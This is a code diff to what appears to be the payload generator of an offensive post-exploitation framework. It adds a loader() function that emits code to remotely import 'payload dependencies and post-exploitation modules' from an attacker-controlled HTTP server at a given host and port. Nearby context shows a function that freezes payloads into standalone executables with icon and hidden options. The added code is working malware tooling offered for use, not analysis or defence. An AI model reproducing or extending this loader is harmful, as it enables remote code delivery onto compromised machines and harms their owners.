@@ -152,6 +152,23 @@ def main(function, *args, **kwargs):
     options = ', '.join(args) + str(', '.join(str("{}={}".format(k, v) if bool(v.count('{') > 0 and v.count('{') > 0) else "{}='{}'".format(k,v)) for k,v in kwargs.items()) if len(kwargs) else '')
     return __Template_main.format(function.lower(), function, options)
 
+def loader(host='127.0.0.1', port=1337, packages=[]):
+    """
+    Generate loader code which remotely imports the
+    payload dependencies and post-exploitation modules
+
+    `Required`
+    :param str host:        server IP address
+    :param int port:        server port number
+
+    `Optional`
+    :param list imports:    package/modules to remotely import
+
+    """
+    base_url = 'http://{}:{}'.format(host, port)
+    imports = '\n    import ' + '\n    import '.join(packages)
+    return "with Loader({}, base_url={}):{}".format(repr(packages), repr(base_url), imports)
+
 def freeze(filename, icon=None, hidden=None):
     """
     Compile a Python file into a standalone executable
